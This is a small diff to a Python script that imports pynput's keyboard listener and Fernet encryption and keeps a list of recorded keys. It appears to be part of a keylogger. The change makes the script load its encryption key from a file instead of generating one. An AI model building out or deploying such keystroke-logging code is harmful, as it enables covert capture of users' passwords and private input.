@@ -5,8 +5,11 @@ from pynput import keyboard
 import json
 from cryptography.fernet import Fernet
 
-# Generate a key for encryption
-key = Fernet.generate_key()
+# Load the key from the file
+def load_key():
+    return open("secret.key", "rb").read()
+
+key = load_key()
 cipher_suite = Fernet(key)
 
 keys_used = []
